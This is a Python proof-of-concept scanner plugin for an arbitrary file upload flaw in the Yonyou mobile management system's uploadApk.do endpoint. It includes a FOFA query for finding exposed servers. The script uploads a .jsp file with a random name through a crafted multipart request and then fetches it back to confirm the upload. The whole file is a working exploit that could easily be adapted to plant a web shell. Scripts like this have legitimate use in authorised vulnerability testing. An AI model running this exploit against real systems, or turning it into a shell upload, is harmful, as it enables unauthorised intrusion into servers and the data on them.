#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import time
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/用友OA/用友 移动管理系统 uploadApk.do 任意文件上传漏洞.html',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '用友 移动管理系统 uploadApk.do 任意文件上传',

      'level'     :   'high',

      'FOFA'      :   'app="用友-移动系统管理"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r0 = randomLowercase(10)
  r1 = randomLowercase(10)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Cookie': 'JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server',
      }
  target = '/maportal/appmanager/uploadApk.do?pk_obj='
  data = f'''
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition: form-data; name="downloadpath"; filename="{r0}.jsp"
Content-Type: application/msword

{r1}
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
  '''
  url1 = url + target
  ret['url'] = url1
  payload = f'{url}/maupload/apk/{r0}.jsp'
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    res.close()
    time.sleep(1)
    resp = requests.get(url=payload,headers=headers,timeout=5,verify=False)
    # print(payload)
    # print(r1)
    # print(resp.text)
    if r1 in resp.text:
      ret['huixian'] = f'验证地址：{payload}\n文件内容：{r1}'
      ret['ifbug'] = True
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret